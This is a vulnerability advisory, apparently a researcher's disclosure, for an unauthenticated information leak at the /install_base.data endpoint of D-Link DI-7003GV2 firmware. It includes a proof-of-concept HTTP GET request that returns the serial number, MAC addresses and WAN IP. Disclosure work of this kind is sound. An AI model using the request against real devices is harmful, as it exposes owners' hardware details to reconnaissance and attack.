# Overview

- Manufacturer's website information：https://www.dlink.com/
- Firmware download address ：http://www.dlink.com.cn/techsupport/download.ashx?file=7828

# Affected version

DI-7003GV2-24.04.18D1 R(68125)

# Vulnerability description

The D-Link DI-7003GV2 firmware version 24.04.18D1 R(68125) contains an information disclosure vulnerability in the `/install_base.data` endpoint. This unauthenticated interface allows remote attackers to access sensitive device details, including serial number, MAC addresses, model, firmware version, and WAN IP address.

# Vulnerability details

The processing function for `install_base.data` interface is `sub_419884`.

![图 0](img/c9d89c58b22d85fd174d52469f10a5fa0c770b8a314c2f5c75b12fa8e83711b1.png)  


The function `sub_419884` will outputs sensitive information such as sn code, device model, version, etc.

![图 1](img/d34026d608cba16c6b7de209ad38ab789d6aa82d0d862c338bd1dc858e4b5633.png)  


# Poc

```http
GET /install_base.data HTTP/1.1
Host: 192.168.140.240
Content-Length: 0
Cache-Control: max-age=0
Origin: http://192.168.140.240
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.140.240/login.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive
```

![图 2](img/883806ec67acaa5c2a873e3d042415e0892ceaa3b1e2fcc1753494b0b88273ab.png)  
